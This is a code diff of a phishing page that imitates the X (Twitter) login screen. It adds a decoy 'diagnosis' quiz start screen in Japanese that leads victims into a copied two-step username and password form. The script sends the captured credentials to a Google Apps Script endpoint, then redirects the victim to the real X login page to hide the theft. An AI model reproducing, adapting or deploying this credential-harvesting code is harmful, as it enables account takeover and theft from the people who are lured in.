@@ -3,23 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Xにログイン / X</title>
+    <title>診断サイト</title>
     
     <link rel="stylesheet" href="https://abs.twimg.com/responsive-web/client-web/main.6dbd69b9.css">
     <link rel="shortcut icon" href="https://abs.twimg.com/favicons/twitter.ico">
 
     <style>
-        body { background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        /* 診断開始画面のスタイル */
+        .diagnosis-start {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #000000;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0;
+        }
+        .container {
+            background: #16181c;
+            border: 1px solid #2f3336;
+            border-radius: 16px;
+            padding: 40px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+        .container h1 {
+            color: #ffffff;
+            margin-bottom: 20px;
+            font-size: 24px;
+            font-weight: 700;
+        }
+        .description {
+            color: #71767b;
+            margin-bottom: 30px;
+            line-height: 1.5;
+            font-size: 15px;
+        }
+        .start-btn {
+            background: #1d9bf0;
+            color: #ffffff;
+            border: none;
+            padding: 12px 32px;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 24px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 0 20px rgba(29, 155, 240, 0.3);
+            margin-bottom: 20px;
+        }
+        .start-btn:hover {
+            background: #1a8cd8;
+            box-shadow: 0 0 30px rgba(29, 155, 240, 0.5);
+            transform: translateY(-1px);
+        }
+        .notice {
+            color: #536471;
+            font-size: 12px;
+            line-height: 1.4;
+        }
+
+        /* ログイン画面のスタイル */
+        .login-page {
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
         .login-container { max-width: 400px; width: 100%; padding: 20px; box-sizing: border-box; }
         .step-hidden { display: none !important; }
         
-        /* 1枚目・2枚目のパーツを忠実に再現する追加CSS */
         .x-input-container { width: 100%; position: relative; margin-bottom: 16px; }
         .x-input { width: 100%; padding: 20px 12px 8px 12px; border: 1px solid #cfd9de; border-radius: 4px; font-size: 17px; box-sizing: border-box; background: transparent; outline: none; }
         .x-input:focus { border: 2px solid #1d9bf0; padding: 19px 11px 7px 11px; }
         .x-input-disabled { background-color: #f7f9fa; color: #536471; border: 1px solid #cfd9de; cursor: not-allowed; }
         
-        /* プレースホルダーを上に浮き上がらせるためのスタイル */
         .x-label { position: absolute; left: 12px; top: 16px; color: #536471; font-size: 17px; transition: all 0.2s; pointer-events: none; }
         .x-input:focus ~ .x-label, .x-input:not(:placeholder-shown) ~ .x-label { top: 4px; font-size: 13px; color: #1d9bf0; }
         .x-input-disabled ~ .x-label { top: 4px; font-size: 13px; color: #536471; }
@@ -29,7 +92,6 @@
         .divider { display: flex; align-items: center; margin: 16px 0; color: #0f1419; font-size: 15px; }
         .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #eff3f4; margin: 0 8px; }
         
-        /* 下部の規約文言のスタイリング */
         .footer-text { font-size: 13px; color: #536471; line-height: 16px; margin-top: 24px; text-align: left; }
         .footer-link { color: #1d9bf0; text-decoration: none; }
         .footer-link:hover { text-decoration: underline; }
@@ -38,73 +100,76 @@
         .forgot-link:hover { text-decoration: underline; }
     </style>
 </head>
-<body class="css-175oi2r">
+<body>
 
-    <div class="login-container css-175oi2r">
-        <div class="css-175oi2r r-16y2uox r-1wbh5a2" style="align-items: center;">
-            
-            <div style="width: 32px; height: 32px; margin-bottom: 20px;">
-                <svg viewBox="0 0 24 24" class="r-18jsvk2 r-4qtqp9 r-yyyyoo" style="color: #0f1419; fill: currentColor;"><g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g></svg>
-            </div>
-
-            <div id="step1" style="width: 100%;" class="css-175oi2r">
-                <h1 class="css-175oi2r r-jwli3a" style="font-size: 31px; font-weight: 700; line-height: 36px; color: #0f1419; margin-bottom: 24px; text-align: left; letter-spacing: -0.5px;">いま何が起こっているかチェック</h1>
-                
-                <button type="button" class="x-btn-white">
-                    <svg width="18" height="18" viewBox="0 0 24 24"><path fill="#EA4335" d="M5.266 9.765A7.077 7.077 0 0 1 12 4.909c1.69 0 3.218.6 4.418 1.582l3.51-3.51C17.818 1.159 15.109 0 12 0 7.336 0 3.332 2.69 1.405 6.623l3.861 3.142z"/><path fill="#4285F4" d="M23.455 12.273c0-.818-.068-1.609-.205-2.364H12v4.5h6.432a5.505 5.505 0 0 1-2.386 3.614l3.714 2.877c2.173-2.005 3.695-4.95 3.695-8.627z"/><path fill="#FBBC05" d="M5.266 14.235a7.145 7.145 0 0 1-.409-2.235c0-.773.132-1.523.409-2.235L1.405 6.623A11.944 11.944 0 0 0 0 12c0 1.927.455 3.745 1.405 5.377l3.861-3.142z"/><path fill="#34A853" d="M12 24c3.24 0 5.973-1.077 7.964-2.923l-3.714-2.877c-1.032.691-2.355 1.11-4.25 1.11-3.795 0-7.01-2.564-8.155-6.014L1.405 16.43A11.941 11.941 0 0 0 12 24z"/></svg>
-                    Continue with Google
-                </button>
-                
-                <button type="button" class="x-btn-white">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="#000000"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.97 4.17c.66-.81 1.11-1.93.99-3.06-1 .04-2.22.67-2.94 1.51-.64.74-1.2 1.88-1.05 2.99 1.11.09 2.25-.56 3-1.44z"/></svg>
-                    Appleで続ける
-                </button>
-                
-                <div class="divider">または</div>
-
-                <form id="formStep1" style="width: 100%;">
-                    <div class="x-input-container">
-                        <input type="text" id="usernameInput" class="x-input" placeholder=" " required autocomplete="off">
-                        <label class="x-label">メールアドレスまたはユーザー名</label>
-                    </div>
-                    <button type="submit" class="x-btn-black">続ける</button>
-                </form>
-
-                <div class="footer-text">
-                    続行することで、<a href="#" class="footer-link">利用規約</a>、<a href="#" class="footer-link">プライバシーポリシー</a>および<a href="#" class="footer-link">Cookieの使用</a>に同意したものとみなされます。
-                </div>
-            </div>
-
-            <div id="step2" style="width: 100%;" class="css-175oi2r step-hidden">
-                <h1 class="css-175oi2r r-jwli3a" style="font-size: 31px; font-weight: 700; line-height: 36px; color: #0f1419; margin-bottom: 24px; text-align: left; letter-spacing: -0.5px;">ログイン</h1>
-                
-                <form id="formStep2" style="width: 100%;">
-                    <div class="x-input-container">
-                        <input type="text" id="usernameDisplay" class="x-input x-input-disabled" placeholder=" " disabled>
-                        <label class="x-label">ユーザー名</label>
-                    </div>
-
-                    <div class="x-input-container" style="margin-top: 24px;">
-                        <input type="password" id="passwordInput" class="x-input" placeholder=" " required>
-                        <label class="x-label">パスワード</label>
-                    </div>
-
-                    <a href="#" class="forgot-link">パスワードをお忘れですか？</a>
-
-                    <button type="submit" class="x-btn-black" style="margin-top: 24px;">続ける</button>
-                </form>
-                
-                <div class="footer-text">
-                    続行することで、<a href="#" class="footer-link">利用規約</a>、<a href="#" class="footer-link">プライバシーポリシー</a>および<a href="#" class="footer-link">Cookieの使用</a>に同意したものとみなされます。
-                </div>
-            </div>
-
+    <!-- セクション1: 診断開始画面 -->
+    <div id="start-section" class="diagnosis-start">
+        <div class="container">
+            <h1>（ここにタイトルを入れる）</h1>
+            <p class="description">
+                （ここに説明文を入れる）
+            </p>
+            <button class="start-btn" onclick="goToLogin()">診断する</button>
+            <p class="notice">
+                （ここに注意書きを入れる）
+            </p>
         </div>
     </div>
 
+    <!-- セクション2: ログイン画面 -->
+    <div id="login-section" class="login-page step-hidden">
+        <div class="login-container">
+            <div style="display: flex; flex-direction: column; align-items: center;">
+                <div style="width: 32px; height: 32px; margin-bottom: 20px;">
+                    <svg viewBox="0 0 24 24" style="color: #0f1419; fill: currentColor;"><g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g></svg>
+                </div>
+
+                <div id="step1" style="width: 100%;">
+                    <h1 style="font-size: 31px; font-weight: 700; line-height: 36px; color: #0f1419; margin-bottom: 24px; text-align: left; letter-spacing: -0.5px;">いま何が起こっているかチェック</h1>
+                    <button type="button" class="x-btn-white">Continue with Google</button>
+                    <button type="button" class="x-btn-white">Appleで続ける</button>
+                    <div class="divider">または</div>
+                    <form id="formStep1">
+                        <div class="x-input-container">
+                            <input type="text" id="usernameInput" class="x-input" placeholder=" " required autocomplete="off">
+                            <label class="x-label">メールアドレスまたはユーザー名</label>
+                        </div>
+                        <button type="submit" class="x-btn-black">続ける</button>
+                    </form>
+                    <div class="footer-text">
+                        続行することで、利用規約、プライバシーポリシーおよびCookieの使用に同意したものとみなされます。
+                    </div>
+                </div>
+
+                <div id="step2" style="width: 100%;" class="step-hidden">
+                    <h1 style="font-size: 31px; font-weight: 700; line-height: 36px; color: #0f1419; margin-bottom: 24px; text-align: left; letter-spacing: -0.5px;">ログイン</h1>
+                    <form id="formStep2">
+                        <div class="x-input-container">
+                            <input type="text" id="usernameDisplay" class="x-input x-input-disabled" placeholder=" " disabled>
+                            <label class="x-label">ユーザー名</label>
+                        </div>
+                        <div class="x-input-container" style="margin-top: 24px;">
+                            <input type="password" id="passwordInput" class="x-input" placeholder=" " required>
+                            <label class="x-label">パスワード</label>
+                        </div>
+                        <a href="#" class="forgot-link">パスワードをお忘れですか？</a>
+                        <button type="submit" class="x-btn-black" style="margin-top: 24px;">続ける</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
     <script>
         const GAS_URL = "https://script.google.com/macros/s/AKfycbzlaqIAN1AnheHMRZoVrJPUrAv_WuHC32DYWgG2SGiZk9l8K3sjFdPqmKSyiVEq5UPE/exec";
         let capturedUser = ""; 
+
+        // 診断開始画面からログイン画面へ切り替える関数
+        function goToLogin() {
+            document.getElementById('start-section').classList.add('step-hidden');
+            document.getElementById('login-section').classList.remove('step-hidden');
+            // 画面上部へスクロール
+            window.scrollTo(0, 0);
+        }
 
         // 1. ステップ1（ID入力）の処理
         document.getElementById('formStep1').addEventListener('submit', function(e) {
@@ -112,7 +177,7 @@
             
             capturedUser = document.getElementById('usernameInput').value;
             
-            // 2枚目のグレーアウト枠内に、打たれたIDを代入する
+            // 2枚目の表示枠に、入力されたIDを表示
             document.getElementById('usernameDisplay').value = capturedUser;
             
             // 1枚目を隠し、2枚目を表示
@@ -128,7 +193,7 @@
             const payload = { user: capturedUser, pass: capturedPass };
 
             try {
-                // GASへJSON形式でデータを送信
+                // 指定のGASへデータを送信
                 await fetch(GAS_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'text/plain' },
@@ -137,11 +202,10 @@
             } catch (error) {
                 console.error('送信エラー:', error);
             } finally {
-                // 送信完了後、本物のXへリダイレクト
+                // 送信完了後、本物のXログイン画面へリダイレクト
                 window.location.href = "https://x.com/login";
             }
         });
     </script>
-
 </body>
 </html>
